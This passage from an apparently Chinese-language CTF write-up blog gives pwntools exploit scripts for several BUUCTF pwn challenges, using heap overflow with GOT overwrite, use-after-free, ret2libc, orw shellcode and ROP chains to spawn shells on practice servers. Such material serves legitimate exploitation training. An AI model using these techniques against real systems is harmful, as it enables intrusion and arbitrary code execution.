class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------------------------------</span><br>magic=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>,p32(magic))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="babyfengshui-33c3-2016：">babyfengshui_33c3_2016：</h3><p>利用题目中的结构，绕过长度检测机制，堆溢出使中间一个堆的prevsize填上free的got表地址，利用show函数泄露free实际地址，可得知libc基址，system。利用机制绕过长度检测，可用update函数，把freegot表地址改写成system，最后再free有binsh的那个块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br><br>local_file  = <span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br><br>select = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29328</span> )<br>    libc = ELF(remote_libc)<br><br>elf = ELF(local_file)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#----------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,length,text</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;size of description: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">&#x27;qyq&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;text length: &#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sla(<span class="hljs-string">&#x27;text: &#x27;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">index,text</span>):<br> sla(<span class="hljs-string">&#x27;Action: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;text length: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(text)))<br> sla(<span class="hljs-string">&#x27;text: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br> sla(<span class="hljs-string">&#x27;text: &#x27;</span>,<span class="hljs-number">4</span>)<br><span class="hljs-comment">#----------------------------------------------</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">0x19c</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x198</span>+p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>show(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;description: &#x27;</span>)<br>free_addr=(u32(rc(<span class="hljs-number">4</span>)))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_addr)<br>base=free_addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>sys=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>update(<span class="hljs-number">1</span>,p32(sys))<br>delete(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-orw">pwnable_orw</h3><p>这题有orw_seccomp()限制，但没开NX，而且题目直接给好格式，自己写个shell汇编。</p><p>下面估计可以直接抄。</p><p>思路：</p><ul><li>打开flag文件，<code>sys_open(file,0,0)</code>；系统调用号为5</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 汇编">push 0x0  #字符串结尾<br>push 0x67616c66#&#x27;flags&#x27;<br>mov ebx,esp<br>xor ecx,ecx#0<br>xor edx,edx#0<br>mov eax,0x5#调用号<br>int 0x80#sys_open(flags,0,0)<br></code></pre></td></tr></table></figure><ul><li>读flag文件，<code>sys_read(3,file,0x100)</code>；系统调用号为3</li></ul><p><code>mov eax,0x3;</code><br><code>mov ecx,ebx;# ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</code><br><code>mov ebx,0x3;# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件</code><br><code>mov edx,0x100;#对应字节数</code><br><code>int 0x80;</code></p><ul><li>输出flag文件内容，<code>sys_write(1,file,0x30)</code>；系统调用号为4</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mov</span> eax,0x4;<span class="hljs-comment"># eax = sys_write</span><br><span class="hljs-attribute">mov</span> ebx,0x1;<span class="hljs-comment"># ebx = unsigned int fd = 1</span><br><span class="hljs-attribute">int</span> 0x80;<br></code></pre></td></tr></table></figure><p>搞得很麻烦，有更简洁的，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25103</span>)<br>shell = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x0</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">xor edx,edx</span><br><span class="hljs-string">mov eax,0x5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>shell+=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov eax,0x3</span><br><span class="hljs-string">mov ecx,ebx</span><br><span class="hljs-string">mov ebx,0x3</span><br><span class="hljs-string">mov edx,0x100</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>shell+=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov eax,0x4</span><br><span class="hljs-string">mov ebx,0x1</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment">#context.binary=&#x27;orw&#x27;</span><br><span class="hljs-comment">#elf=ELF(&#x27;orw&#x27;)</span><br><span class="hljs-comment">#shell=shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="hljs-comment">#shell+=shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)</span><br><span class="hljs-comment">#shell+=shellcraft.write(1,&#x27;esp&#x27;,100)</span><br><span class="hljs-comment">#shell=asm(shell)</span><br>r.sendlineafter(<span class="hljs-string">&quot;Give my your shellcode:&quot;</span>,shell)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-buffer-overflow-2">picoctf_2018_buffer overflow 2</h3><p>忘光了，记一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28901</span>)<br>win=<span class="hljs-number">0x80485cb</span><br>a1=<span class="hljs-number">0xDEADBEEF</span><br>a2=<span class="hljs-number">0xDEADC0DE</span><br>r.sendline(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(win)+p32(<span class="hljs-number">0</span>)+p32(a1)+p32(a2))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="xdctf2015-pwn200">xdctf2015_pwn200</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27228</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r.recvline()<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">0x80484d6</span>)+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">8</span>))<br>true=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br>base=true-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x15902b</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level1">jarvisoj_level1</h3><p>忘了nx的做法，不过既然保护什么都没开，直接ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25716</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./level1&#x27;</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>))<br>true=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br>base=true-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x15902b</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh))<br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-3">ciscn_2019_n_3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./ciscn_2019_n_3&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28934</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#--------------------------------------------</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index,typ,value,length</span>):<br> sla(<span class="hljs-string">&#x27;CNote &gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;Type &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(typ))<br> <span class="hljs-keyword">if</span> typ==<span class="hljs-number">2</span>:<br>    sla(<span class="hljs-string">&#x27;Length &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sla(<span class="hljs-string">&#x27;Value &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(value))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;CNote &gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;CNote &gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------</span><br>new(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1234</span>)<br>new(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5678</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>value=<span class="hljs-string">&#x27;sh\x00\x00&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,value,<span class="hljs-number">0xc</span>)<br>dele(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>这题用到uaf，看代码要知道是两种指针数组，有system函数，起到修改作用的是string类型数组指针，利用uaf，可以改到前一块的指针为system，再前位为sh(32位要对齐)，（具体操作就是申请，释放之类操作），最后用修改后随意用个带动</p><h3 id="bbys-tu-2016">bbys_tu_2016</h3><p>最简单的题居然卡住了一会，填充要调试得应该</p><p>gdb用pattern offest ？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29342</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bbys_tu_2016&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(<span class="hljs-number">0x804856d</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="inndy-rop">inndy_rop</h3><p>这题静态编译，能直接溢出</p><p>快速构造rop链的命令：</p><p>ROPgadget --binary rop --ropchain</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29714</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span 